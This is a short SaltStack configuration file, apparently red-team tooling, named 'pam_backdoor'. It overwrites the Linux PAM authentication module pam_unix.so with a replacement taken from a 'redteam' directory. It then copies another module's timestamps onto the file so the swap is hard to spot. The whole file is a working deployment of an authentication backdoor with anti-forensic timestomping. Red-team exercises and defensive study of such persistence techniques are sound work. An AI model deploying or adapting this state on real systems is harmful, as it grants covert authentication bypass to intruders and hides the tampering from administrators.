pam_backdoor:
  file.managed:
    - name: /lib/x86_64-linux-gnu/security/pam_unix.so
    - source: salt://redteam/linux/pam_unix.so
    - user: root
    - group: root
    - mode: 644
  cmd.run:
    - name: touch -r /lib/x86_64-linux-gnu/security/pam_access.so /lib/x86_64-linux-gnu/security/pam_unix.so